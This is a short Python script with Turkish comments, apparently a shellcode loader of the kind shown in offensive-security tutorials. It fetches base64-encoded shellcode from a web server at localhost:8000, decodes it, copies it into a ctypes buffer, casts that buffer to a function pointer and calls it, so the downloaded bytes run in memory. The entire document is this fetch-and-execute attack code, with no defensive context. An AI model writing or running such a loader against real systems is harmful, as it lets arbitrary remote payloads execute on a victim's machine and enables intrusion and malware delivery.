import base64
import ctypes
import urllib.request

# web sunucumuzdan shell kodunu alın
url = "http://localhost:8000/shellcode.bin"
response = urllib.request.urlopen(url)

# shell kodunun base64 kodunu çöz
shellcode = base64.b64decode(response.read())

# bellekte bir buffer oluştur
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# shell kodumuza bir pointer işlevi oluşturun
shellcode_func = ctypes.cast(shellcode_buffer,
                             ctypes.CFUNCTYPE(ctypes.c_void_p))

# shell kodunu çağırın
shellcode_func()
